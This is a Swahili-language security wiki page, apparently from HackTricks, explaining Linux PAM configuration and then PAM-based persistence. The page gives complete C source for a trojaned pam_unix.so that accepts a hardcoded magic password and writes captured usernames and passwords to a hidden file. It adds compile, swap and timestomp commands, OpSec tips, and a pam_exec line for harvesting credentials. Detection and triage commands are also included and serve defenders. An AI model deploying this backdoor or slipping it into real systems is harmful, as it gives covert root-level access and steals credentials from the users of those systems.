# PAM - Pluggable Authentication Modules

{{#include ../../banners/hacktricks-training.md}}

### Taarifa za Msingi

**PAM (Pluggable Authentication Modules)** hufanya kazi kama utaratibu wa usalama unaothibitisha utambulisho wa watumiaji wanaojaribu kufikia huduma za kompyuta, na kudhibiti ufikiaji wao kwa kuzingatia vigezo mbalimbali. Ni kama mlinzi wa kidijitali, anayehakikisha kuwa watumiaji walioidhinishwa pekee ndio wanaoweza kutumia huduma mahususi, huku ikiwezekana ikizuia matumizi yao ili kuzuia mfumo kulemewa.

#### Faili za Usanidi

- **Solaris** inasaidia faili kuu ya zamani `/etc/pam.conf`, lakini mwongozo wa sasa unapendelea faili za huduma ndani ya `/etc/pam.d`.<sup>[[10]](#references)</sup>
- **Linux systems** hupendelea kutumia saraka, kwa kuhifadhi usanidi maalum wa kila huduma ndani ya `/etc/pam.d`. Kwa mfano, faili ya usanidi ya huduma ya login iko kwenye `/etc/pam.d/login`.<sup>[[1]](#references)</sup>

Mfano wa usanidi wa PAM wa huduma ya login unaweza kuonekana hivi:

```
auth required /lib/security/pam_securetty.so
auth required /lib/security/pam_nologin.so
auth sufficient /lib/security/pam_ldap.so
auth required /lib/security/pam_unix_auth.so try_first_pass
account sufficient /lib/security/pam_ldap.so
account required /lib/security/pam_unix_acct.so
password required /lib/security/pam_cracklib.so
password required /lib/security/pam_ldap.so
password required /lib/security/pam_pwdb.so use_first_pass
session required /lib/security/pam_unix_session.so
```

#### **Maeneo ya Usimamizi wa PAM**

Maeneo haya, au makundi ya usimamizi, yanajumuisha **auth**, **account**, **password**, na **session**, ambapo kila moja inawajibika kwa vipengele tofauti vya mchakato wa uthibitishaji na usimamizi wa session:<sup>[[1]](#references)</sup>

- **Auth**: Huthibitisha utambulisho wa mtumiaji, mara nyingi kwa kumwomba nenosiri.
- **Account**: Hushughulikia uthibitishaji wa akaunti, kwa kuangalia masharti kama uanachama wa kundi au vizuizi vya muda wa siku.
- **Password**: Husimamia masasisho ya nenosiri, yakiwemo ukaguzi wa uchangamano au uzuiaji wa dictionary attacks.
- **Session**: Husimamia vitendo wakati session ya huduma inapoanza au kumalizika, kama vile kuweka directories kwenye mfumo au kuweka vikomo vya rasilimali.

#### **Vidhibiti vya Moduli za PAM**

Vidhibiti huamua jinsi moduli inavyojibu mafanikio au kushindwa, na hivyo kuathiri mchakato mzima wa uthibitishaji. Hivi ni pamoja na:<sup>[[1]](#references)</sup>

- **Required**: Moduli ya required ikishindwa, hatimaye mchakato hushindwa, lakini baada tu ya moduli zote zinazofuata kukaguliwa.
- **Requisite**: Mchakato husitishwa mara moja moduli inaposhindwa.
- **Sufficient**: Ikiwa hakuna moduli ya awali ya `required` iliyoshindwa, mafanikio hurudishwa mara moja na moduli zilizobaki katika kundi lilelile la usimamizi hurukwa.
- **Optional**: Husababisha kushindwa tu ikiwa ndiyo moduli pekee kwenye stack.

#### Semantiki za Offensive Zilizo Muhimu

Unapochanganua au kurekebisha PAM, **mahali ambapo sheria imeingizwa** huamua stack itakayoitumia:<sup>[[1]](#references)[[13]](#references)</sup>

- `include` na `substack` huleta sheria kutoka kwenye files nyingine, hivyo kuhariri `sshd` kunaweza kuathiri SSH pekee, ilhali kuhariri `system-auth`, `common-auth`, au stack nyingine ya pamoja kunaathiri huduma kadhaa kwa wakati mmoja.<sup>[[1]](#references)[[13]](#references)</sup>
- PAM pia inasaidia vidhibiti vilivyowekwa kwenye mabano kama `[success=1 default=ignore]`. Hivi vinaweza kutumiwa vibaya **kuruka moduli moja au zaidi** baada ya ukaguzi maalum kufanikiwa, badala ya kubadilisha `pam_unix.so` kwa njia inayoonekana.<sup>[[1]](#references)</sup>
- `module-path` inaweza kuwa **absolute** (`/usr/lib/security/pam_custom.so`) au **relative** kwa directory chaguomsingi ya moduli za PAM. Kwenye mifumo ya kisasa ya Linux, directories halisi mara nyingi ni `/lib/security`, `/lib64/security`, `/usr/lib/security`, au njia za multiarch kama `/usr/lib/x86_64-linux-gnu/security`.<sup>[[1]](#references)[[14]](#references)</sup>

Jambo la haraka kwa operator: kila mara chora **grafu nzima ya huduma** kabla ya kufanya marekebisho. Kwa mfano, `sshd -> password-auth -> system-auth` kwenye baadhi ya distros, au `sshd -> system-remote-login -> system-login -> system-auth` kwenye nyingine, inamaanisha implant ileile ya mstari mmoja inaweza kuathiri sehemu nyingi zaidi ya ilivyokusudiwa.<sup>[[1]](#references)[[13]](#references)</sup>

Moduli maalum ya `auth` inaweza kuongeza changamoto ya mwingiliano kwa `sudo` baada ya nenosiri la akaunti. Kagua stack halisi ya `/etc/pam.d/sudo`, policy inayojumuishwa, arguments za moduli, na permissions za faili yoyote ya data ya ndani inayorejelewa kabla ya kukagua changamoto hiyo mwenyewe. Orodha ya maneno ya changamoto inayosomeka peke yake haibypass ukaguzi wa nenosiri wala kutoa ruhusa ya sudoers. Mpito wenye upendeleo bado unahitaji uthibitishaji sahihi wa akaunti, kukamilishwa kwa kila hatua ya PAM inayohitajika, na sheria ya sudo inayoweza kutoa root; enumeration isiyohudumiwa haipaswi kusababisha changamoto hiyo.

Kwa [kasoro ya umiliki ya `pam_motd` ya Ubuntu ya zamani (CVE-2010-0832)](https://ubuntu.com/security/cve-2010-0832), kagua build halisi ya `libpam-modules` na kama huduma ya login inatumia moduli ya session iliyoathiriwa. Ubuntu iliirekebisha katika **1.1.0-2ubuntu1.1** kwa 9.10 na **1.1.1-2ubuntu5** kwa 10.04 LTS; matoleo mengine au backports za vendor zinahitaji tathmini yao ya package. Njia iliyoripotiwa ilihitaji mpigaji kubadilisha `.cache` ya nyumbani kwake kuwa symlink, kisha kuanzisha PAM login, na kusababisha moduli ya zamani kubadilisha umiliki wa target iliyolindwa. Kuwepo kwa `.cache`, mstari wa `pam_motd.so`, au toleo la zamani la kernel peke yake hakuthibitishi kuwa mfumo uko hatarini; kagua udhibiti wa home directory, toleo halisi la moduli, uwezekano wa kuanzisha login, ushughulikiaji wa symlink, na permissions za target bila kubadilisha files au kuanzisha login wakati wa enumeration tulivu. Tazama [taarifa ya usalama ya Ubuntu](https://ubuntu.com/security/notices/USN-959-1).

#### Mfano wa Hali

Katika usanidi wenye moduli nyingi za auth, mchakato hufuata mpangilio madhubuti. Ikiwa moduli ya `pam_securetty` itagundua kuwa terminal ya login hairuhusiwi, logins za root huzuiwa, lakini moduli zote bado hushughulikiwa kwa sababu ya hali yake ya "required". `pam_env` huweka environment variables, jambo linaloweza kuboresha matumizi ya mtumiaji. Moduli za `pam_ldap` na `pam_unix` hufanya kazi pamoja kuthibitisha mtumiaji, huku `pam_unix` ikijaribu kutumia nenosiri lililotolewa awali, na hivyo kuongeza ufanisi na unyumbufu katika mbinu za uthibitishaji.<sup>[[1]](#references)[[13]](#references)[[15]](#references)[[16]](#references)[[17]](#references)</sup>


## `pam_permit` kwenye stack ya huduma

`pam_permit.so` hurejesha mafanikio kwa ukaguzi wa PAM. Ikiwa mtumiaji mwenye ruhusa ndogo anaweza kurekebisha policy halisi ya PAM ya huduma, kuiingiza pamoja na control flag inayokatisha stack ya uthibitishaji mapema kunaweza kuondoa ukaguzi wa nenosiri kwa huduma hiyo. Kwa `sudo`, kagua `/etc/pam.d/sudo` na faili yoyote iliyojumuishwa ya `common-auth` au `system-auth` kabla ya kuamua ni huduma zipi zinazoathiriwa. PAM authentication bypass **haitoi** sheria mpya ya sudoers; mtumiaji bado lazima awe na ruhusa ya kuendesha amri iliyoombwa. Kagua mpangilio wa sheria na kushindwa kokote kwa `required` ya awali badala ya kudhani kuwa mstari mmoja wa `sufficient pam_permit.so` hufaulu kila mara.

## Kuweka Backdoor kwenye PAM – Hooking `pam_unix.so`

Mbinu ya kawaida ya persistence katika mazingira muhimu ya Linux ni **kubadilisha library halali ya PAM na drop-in iliyoambatanishwa na trojan**. Kwenye host ambayo stack yake ya PAM hupakia `pam_unix.so`, uthibitishaji wa SSH au console unaweza kuita entry point yake ya `pam_sm_authenticate()`; replacement hasidi inaweza kunasa credentials au kutekeleza bypass ya nenosiri la *magic*.<sup>[[2]](#references)[[11]](#references)</sup>

### Mwongozo wa Haraka wa Compilation
Mchoro ulio hapa chini unatumia service entry point ya Linux-PAM `pam_sm_authenticate()` na `pam_get_authtok()` kupata token ya uthibitishaji.<sup>[[11]](#references)[[12]](#references)</sup>
<details>
<summary>Trojan ya mfano ya `pam_unix.so`</summary>

```c
#define _GNU_SOURCE
#include <security/pam_modules.h>
#include <security/pam_ext.h>
#include <dlfcn.h>
#include <stdio.h>
#include <fcntl.h>
#include <string.h>
#include <unistd.h>

static void *real_module;
static int (*orig_auth)(pam_handle_t *, int, int, const char **);
static int (*orig_setcred)(pam_handle_t *, int, int, const char **);
static const char *MAGIC = "Sup3rS3cret!";

static int load_original(void) {
    if (real_module) return 0;
    real_module = dlopen("/lib/security/pam_unix.so.bak", RTLD_NOW | RTLD_LOCAL);
    if (!real_module) return -1;
    orig_auth = dlsym(real_module, "pam_sm_authenticate");
    orig_setcred = dlsym(real_module, "pam_sm_setcred");
    return (orig_auth && orig_setcred) ? 0 : -1;
}

PAM_EXTERN int pam_sm_authenticate(pam_handle_t *pamh, int flags, int argc, const char **argv) {
    const char *user = NULL, *pass = NULL;
    pam_get_user(pamh, &user, NULL);
    pam_get_authtok(pamh, PAM_AUTHTOK, &pass, NULL);

    /* Magic pwd → immediate success */
    if(pass && strcmp(pass, MAGIC) == 0) return PAM_SUCCESS;

    /* Credential harvesting */
    if (user && pass) {
        int fd = open("/usr/bin/.dbus.log", O_WRONLY|O_APPEND|O_CREAT, 0600);
        if (fd >= 0) {
            dprintf(fd, "%s:%s\n", user, pass);
            close(fd);
        }
    }

    /* Forward to the renamed original module. */
    if (load_original() != 0) return PAM_SYSTEM_ERR;
    return orig_auth(pamh, flags, argc, argv);
}

PAM_EXTERN int pam_sm_setcred(pam_handle_t *pamh, int flags, int argc, const char **argv) {
    if (load_original() != 0) return PAM_SYSTEM_ERR;
    return orig_setcred(pamh, flags, argc, argv);
}
```

</details>

Kompile na ubadilishe kwa siri (replacement/timestomp pattern imeandikwa na Unit 42). Rekebisha path ya backup iliyoandikwa moja kwa moja kwenye wrapper na amri zilizo hapa chini ili zitumie saraka halisi ya PAM module kwenye target:<sup>[[2]](#references)</sup>
```bash
gcc -fPIC -shared -o pam_unix.so trojan_pam.c -ldl -lpam
mv /lib/security/pam_unix.so /lib/security/pam_unix.so.bak
mv pam_unix.so /lib/security/pam_unix.so
chmod 644 /lib/security/pam_unix.so     # keep original perms
touch -r /bin/ls /lib/security/pam_unix.so  # timestomp
```

### Vidokezo vya OpSec
1. **Kubadilisha kwa atomiki** – andika library kamili kwenye faili ya muda kisha uipeleke mahali pake kwa kuibadilisha, ili kuepuka kuacha authentication module iliyoandikwa kwa sehemu tu.
2. Path kama `/usr/bin/.dbus.log` ilionekana katika uchanganuzi wa AuthDoor wa Unit 42, kwa hiyo pia ni kiashiria muhimu cha kutafuta.<sup>[[2]](#references)</sup>
3. Hifadhi entry points zinazotarajiwa na PAM stack (kwa mfano, `pam_sm_authenticate` na `pam_sm_setcred`) ili shughuli nyingine za usimamizi ziendelee kufanya kazi.<sup>[[11]](#references)[[18]](#references)</sup>

### Utambuzi
Kwa ukaguzi wa uadilifu wa package, RPM huthibitisha metadata ya faili zilizosakinishwa, `debsums -s` huripoti hitilafu za checksum, na `dpkg -S` kwenye triage block hutafuta umiliki wa package; sintaksia ya audit watch hurekodi uandishi na mabadiliko ya sifa kwenye path.<sup>[[6]](#references)[[7]](#references)[[8]](#references)[[9]](#references)</sup>
* Linganisha MD5/SHA256 ya `pam_unix.so` na package ya distro.
* Tumia `rpm -V pam` au `debsums -s libpam-modules` kutambua libraries zilizobadilishwa bila kufanya hashing kwa mkono.
* Angalia kama kuna ruhusa za kuandika kwa kila mtu au umiliki usio wa kawaida chini ya `/lib/security/`.
* Kanuni ya `auditd`: `-w /lib/security/pam_unix.so -p wa -k pam-backdoor`.
* Tafuta kwenye usanidi wa PAM modules zisizotarajiwa: `grep -R "pam_[a-z].*\.so" /etc/pam.d/ | grep -v pam_unix`.

Utafutaji huo wa `pam_` hukosa custom modules zenye majina mengine ya msingi ya `.so`. Kagua mistari **inayotumika** ya `auth`, `account`, `password`, na `session` kwenye `/etc/pam.d` (na `/etc/pam.conf` pale inapotumika), pamoja na control flag yake na stack yoyote iliyojumuishwa. Module usiyoifahamu iliyowekwa kama `auth sufficient` kabla ya ukaguzi wa kawaida wa password inastahili kukaguliwa umiliki wake wa package na binary; [sintaksia ya control ya PAM](https://man7.org/linux/man-pages/man5/pam.d.5.html) inaweza kufanya mafanikio yakatize sehemu hiyo ya stack mapema. Jina la module, timestamp isiyo ya kawaida, au chaguo la `nodelay` pekee halithibitishi bypass. Ikiwa tabia inaashiria timing leak, kagua utekelezaji na ufikikaji wa service kwanza; enumeration ya kawaida haipaswi kuwasilisha majaribio ya authentication mara kwa mara.

### Amri za triage za haraka (baada ya compromise au kutafuta vitisho)
```bash
# 1) Spot alien PAM objects
find /{lib,usr/lib,usr/local/lib}{,64}/security -type f -printf '%p %s %M %u:%g %TY-%Tm-%Td\n' | grep -E 'pam_|libselinux'

# 2) Verify package integrity
command -v rpm >/dev/null && rpm -V pam || debsums -s libpam-modules

# 3) Identify non-packaged PAM modules
for f in /{lib,usr/lib,usr/local/lib}{,64}/security/*.so; do
    dpkg -S "$f" >/dev/null 2>&1 || echo "UNPACKAGED: $f";
done

# 4) Look for stealth config edits
grep -R "pam_.*\.so" /etc/pam.d/ | grep -E 'plg|selinux|custom|exec'
```

### Kutumia vibaya `pam_exec` kwa ajili ya persistence
Badala ya kubadilisha `pam_unix.so`, njia isiyoingilia sana ni kuongeza mstari wa `pam_exec` katika `/etc/pam.d/sshd` ili invocation inayofika kwenye mstari huo wa PAM iendeshe helper huku stack ya kawaida ikiendelea kufanya kazi.<sup>[[4]](#references)</sup>
```bash
# Run during the auth phase; expose_authtok sends the token on stdin
auth optional pam_exec.so quiet expose_authtok /usr/local/bin/.ssh_hook.sh
```
`pam_exec` hupokea metadata ya PAM katika environment variables kama vile `PAM_USER`, `PAM_RHOST`, `PAM_SERVICE`, `PAM_TTY`, na `PAM_TYPE`. Kwa `expose_authtok`, helper inaweza kusoma hadi `PAM_MAX_RESP_SIZE` bytes za password kutoka `stdin` katika awamu za `auth` au `password`. Ikiwa unataka helper iendeshwe kwa effective UID badala ya real UID, ongeza `seteuid`.<sup>[[4]](#references)</sup>

Vidokezo vya vitendo vinavyofuata aina za module na kichujio cha `type=` kilichoandikwa kwa `pam_exec`:<sup>[[4]](#references)</sup>

- `session optional pam_exec.so ...` inafaa zaidi kwa **vitendo baada ya kuingia** kama vile kufungua tena sockets au kuwasha daemon iliyojitenga.
- `auth optional pam_exec.so quiet expose_authtok ...` ndiyo chaguo la kawaida kwa **credential capture** kwa sababu huendeshwa kabla ya session kufunguliwa.
- `type=session` au `type=auth` inaweza kutumika kuzuia utekelezaji kwenye awamu maalum ya PAM na kuepuka utekelezaji wa kurudia wenye kelele.

Kwa ukaguzi wa privilege, path kamili ya helper ya `pam_exec.so` ambayo user wa sasa anaweza kuiandika ni mgombea hata ikiwa file imewekewa alama ya append-only (`a`): [attribute hii huruhusu kuongeza maudhui](https://man7.org/linux/man-pages/man1/chattr.1.html), jambo ambalo linaweza kutosha kubadilisha tabia ya baadaye ya shell script. Kwanza thibitisha kuwa PAM service na tukio vinafika kwenye mstari huo, kuwa helper na path yake ya parent vinaaminika, na kuwa command inaendeshwa chini ya identity yenye privilege zaidi; [`seteuid` hubadilisha PAM UID inayotumika](https://man7.org/linux/man-pages/man8/pam_exec.8.html). File inayoweza kuandikwa au matokeo ya `lsattr` pekee hayathibitishi utekelezaji wenye privilege.

### Kudumu licha ya distro tooling: `authselect`

Kwenye mifumo ya familia ya RHEL na Fedora inayotumia `authselect`, mabadiliko ya moja kwa moja kwenye files zinazozalishwa kama vile `/etc/pam.d/system-auth` au `/etc/pam.d/password-auth` yanaweza **kufutwa na `authselect`**. Ili kudumu, operators mara nyingi hurekebisha profile maalum inayotumika chini ya `/etc/authselect/custom/<profile>/` kisha huichagua tena.<sup>[[5]](#references)[[19]](#references)</sup>

Mtiririko wa kawaida wa kazi ukiwa na root:<sup>[[5]](#references)</sup>

```bash
# Inspect the active profile first
authselect current

# If a custom profile already exists, edit its PAM templates instead of system-auth directly
find /etc/authselect/custom -maxdepth 2 -type f \( -name 'system-auth' -o -name 'password-auth' \) -ls

# Regenerate the PAM files after modifying the active custom profile
authselect apply-changes
```

Hili ni muhimu kwa mashambulizi na triage: ikiwa `/etc/pam.d/system-auth` ina mabango `Generated by authselect` na `Do not modify this file manually`, basi sehemu halisi ya persistence inaweza kuwa chini ya `/etc/authselect/custom/` badala ya `/etc/pam.d/`.<sup>[[5]](#references)</sup>

### Tradecraft ya hivi karibuni iliyoonekana porini

Ripoti za hivi karibuni za 2025 kuhusu backdoor ya Linux ya **Plague** zilionyesha wazo hilohilo kuu likipanuliwa zaidi: sehemu hasidi ya PAM yenye **nenosiri la static bypass**, pamoja na kusafisha environment variables zinazohusiana na SSH na historia ya shell (`HISTFILE=/dev/null`) ili kupunguza athari za session baada ya kuingia.<sup>[[3]](#references)</sup> Huu ni muundo muhimu wa hunting kwa sababu mantiki ya backdoor inaweza kuwa ndani ya PAM huku dalili za kujificha zikionekana tu **baada ya** uthibitishaji kufanikiwa.


## References

- [1] [pam.conf(5) / pam.d(5) - Mwongozo wa Linux-PAM](https://man7.org/linux/man-pages/man5/pam.d.5.html)
- [2] [Kitabu cha Mbinu cha Opereta wa Kificho: Kuingia kwa Siri kwenye Mitandao ya Mawasiliano ya Kimataifa - Unit 42](https://unit42.paloaltonetworks.com/infiltration-of-global-telecom-networks/)
- [3] [Nextron Systems - Plague: Backdoor Mpya ya Linux Iliyogunduliwa Inayotumia PAM](https://www.nextron-systems.com/2025/08/01/plague-a-newly-discovered-pam-based-backdoor-for-linux/)
- [4] [pam_exec(8) - Mwongozo wa Linux-PAM](https://man7.org/linux/man-pages/man8/pam_exec.8.html)
- [5] [Kusanidi uthibitishaji wa watumiaji kwa kutumia authselect - Red Hat Enterprise Linux](https://docs.redhat.com/en/documentation/red_hat_enterprise_linux/10/html/configuring_authentication_and_authorization_in_rhel/configuring-user-authentication-using-authselect)
- [6] [rpm(8) - RPM](https://rpm.org/docs/4.20.x/man/rpm.8)
- [7] [debsums(1) - Kurasa za mwongozo za Debian](https://manpages.debian.org/unstable/debsums/debsums.1.en.html)
- [8] [auditctl(8) - Ukurasa wa mwongozo wa Linux](https://man7.org/linux/man-pages/man8/auditctl.8.html)
- [9] [dpkg-query(1) - Kurasa za mwongozo za Debian](https://manpages.debian.org/testing/dpkg/dpkg-query.1.en.html)
- [10] [Kusimamia Uthibitishaji katika Oracle Solaris 11.4](https://docs.oracle.com/cd/E37838_01/pdf/E67470.pdf)
- [11] [pam_sm_authenticate(3) - Mwongozo wa Linux-PAM](https://man7.org/linux/man-pages/man3/pam_sm_authenticate.3.html)
- [12] [pam_get_authtok(3) - Mwongozo wa Linux-PAM](https://man7.org/linux/man-pages/man3/pam_get_authtok.3.html)
- [13] [Mwongozo wa Uthibitishaji wa Kiwango cha Mfumo - Red Hat Enterprise Linux 7](https://docs.redhat.com/en/documentation/red_hat_enterprise_linux/7/html-single/system-level_authentication_guide/index)
- [14] [Orodha ya faili za kifurushi cha Ubuntu: libpam-modules/noble/amd64](https://packages.ubuntu.com/noble/amd64/libpam-modules/filelist)
- [15] [pam_env(8) - Mwongozo wa Linux-PAM](https://man7.org/linux/man-pages/man8/pam_env.8.html)
- [16] [pam_unix(8) - Mwongozo wa Linux-PAM](https://man7.org/linux/man-pages/man8/pam_unix.8.html)
- [17] [pam_ldap(5) - Kurasa za mwongozo za Debian](https://manpages.debian.org/testing/libpam-ldap/pam_ldap.5.en.html)
- [18] [pam_sm_setcred(3) - Mwongozo wa Linux-PAM](https://man7.org/linux/man-pages/man3/pam_sm_setcred.3.html)
- [19] [Mabadiliko/Kufanya Authselect kuwa ya lazima - Wiki ya Fedora Project](https://fedoraproject.org/wiki/Changes/Make_Authselect_Mandatory)
{{#include ../../banners/hacktricks-training.md}}
